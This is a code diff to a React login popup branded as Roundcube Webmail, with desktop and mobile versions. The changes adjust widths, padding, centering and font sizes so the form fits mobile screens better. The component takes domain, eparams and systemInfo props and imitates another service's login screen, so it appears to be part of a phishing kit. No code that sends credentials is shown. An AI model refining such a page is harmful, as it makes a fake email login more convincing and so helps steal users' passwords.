@@ -11,14 +11,16 @@ const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon }) =>
     alignItems: "center",
     border: "1px solid #d9d9d9",
     borderRadius: 6,
-    overflow: "none",
+    overflow: "none", // ✅ added to contain outline
     background: "#fafafa",
     height: 44,
-    width: "85%"
+    width: "100%", // ✅ changed from 85% to 100% for better mobile fit
+    maxWidth: "400px", // ✅ added maxWidth for larger screens
+    margin: "0 auto" // ✅ center align
   };
 
   const iconBox = {
-    width: 44,
+    width: 48,
     height: "100%",
     display: "flex",
     alignItems: "center",
@@ -31,9 +33,10 @@ const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon }) =>
     border: "none",
     outline: focused ? "5px solid #3DBBFF" : "none", // 👈 only shows on focus
     flex: 1,
-    fontSize: 14,
+    fontSize: 15,
     padding: "10px 12px",
     background: "transparent",
+    width: "100%", // ✅ ensure full width within container
   };
 
   return (
@@ -136,23 +139,25 @@ const Popup = ({ domain, eparams, systemInfo }) => {
   return (
     <div
       style={{
-        padding: "40px",
+        padding: "40px 20px", // ✅ reduced horizontal padding for mobile
         borderRadius: "10px",
         maxWidth: "400px",
         width: "100%",
         fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
+        margin: "0 auto", // ✅ center on larger screens
+        boxSizing: "border-box",
       }}
     >
       <div style={{ textAlign: "center", marginBottom: "30px" }}>
         <img 
-          style={{ width: "100px", height: "auto", marginRight: "50px" }} 
+          style={{ width: "100px", height: "auto", marginRight: "0" }} // ✅ removed right margin
           src="/Roundcube.jpg" 
           alt="Roundcube Webmail" 
         />
       </div>
 
       {/* Username (editable) */}
-      <div style={{ marginBottom: "8px" }}>
+      <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
         <InputWithIcon
           type="text"
           placeholder="Email address"
@@ -163,7 +168,7 @@ const Popup = ({ domain, eparams, systemInfo }) => {
       </div>
 
       {/* Password */}
-      <div style={{ marginBottom: "8px" }}>
+      <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
         <InputWithIcon
           type="password"
           placeholder="Password"
@@ -174,29 +179,32 @@ const Popup = ({ domain, eparams, systemInfo }) => {
       </div>
 
       {/* Login Button */}
-      <button
-        onClick={handleLogin}
-        style={{
-          width: "85%",
-          backgroundColor: "#3DBBFF",
-          color: "#fff",
-          border: "none",
-          padding: "12px",
-          borderRadius: "6px",
-          cursor: "pointer",
-          fontSize: "16px",
-          height: "44px"
-        }}
-      >
-        LOGIN
-      </button>
+      <div style={{ display: "flex", justifyContent: "center" }}>
+        <button
+          onClick={handleLogin}
+          style={{
+            width: "100%",
+            maxWidth: "400px",
+            backgroundColor: "#3DBBFF",
+            color: "#fff",
+            border: "none",
+            padding: "12px",
+            borderRadius: "6px",
+            cursor: "pointer",
+            fontSize: "16px",
+            height: "44px"
+          }}
+        >
+          LOGIN
+        </button>
+      </div>
 
       <div style={{ 
         marginTop: "10px", 
         textAlign: "center", 
         fontSize: "14px", 
         color: "#888", 
-        marginRight: "60px"
+        marginRight: "0" // ✅ removed right margin
       }}>
         Roundcube Webmail
       </div>
@@ -271,20 +279,19 @@ const PopupMobile = ({ domain, eparams, systemInfo }) => {
 
   return (
     <div style={{  
-      padding: "30px 25px", 
+      padding: "20px 15px", // ✅ reduced padding for very small screens
       borderRadius: "10px", 
-      width: "90%",
+      width: "100%",
       maxWidth: "350px",
-      margin: "30px auto", 
+      margin: "20px auto", 
       fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
       boxSizing: "border-box",
-      marginLeft: "60px"
     }}>
-      <div style={{ textAlign: "center", marginBottom: "25px" }}>
+      <div style={{ textAlign: "center", marginBottom: "20px" }}>
         <img 
           src="/Roundcube.jpg" 
           alt="Roundcube Webmail" 
-         style={{ width: "100px", height: "auto", marginRight: "15px", }}
+          style={{ width: "80px", height: "auto", marginRight: "0" }} // ✅ smaller image for mobile
         />
       </div>
 
@@ -311,31 +318,33 @@ const PopupMobile = ({ domain, eparams, systemInfo }) => {
       </div>
 
       {/* Login Button */}
-      <button 
-        onClick={handleLogin} 
-        style={{ 
-          width: "85%", 
-          backgroundColor: "#179bd7", 
-          color: "#fff", 
-          border: "none", 
-          padding: "14px", 
-          fontWeight: "600", 
-          borderRadius: "6px", 
-          cursor: "pointer", 
-          fontSize: "16px", 
-          height: "48px"
-        }}
-      >
-        LOGIN
-      </button>
+      <div style={{ display: "flex", justifyContent: "center" }}>
+        <button 
+          onClick={handleLogin} 
+          style={{ 
+            width: "100%", 
+            maxWidth: "400px",
+            backgroundColor: "#179bd7", 
+            color: "#fff", 
+            border: "none", 
+            padding: "12px", // ✅ reduced padding
+            fontWeight: "600", 
+            borderRadius: "6px", 
+            cursor: "pointer", 
+            fontSize: "15px", // ✅ slightly smaller font
+            height: "44px" // ✅ reduced height
+          }}
+        >
+          LOGIN
+        </button>
+      </div>
 
       <div style={{ 
         marginTop: "10px", 
         textAlign: "center", 
-        fontSize: "14px", 
+        fontSize: "13px", // ✅ smaller font for mobile
         color: "#888",
-        marginRight: "25px"
-        
+        marginRight: "0" // ✅ removed right margin
       }}>
         Roundcube Webmail
       </div>
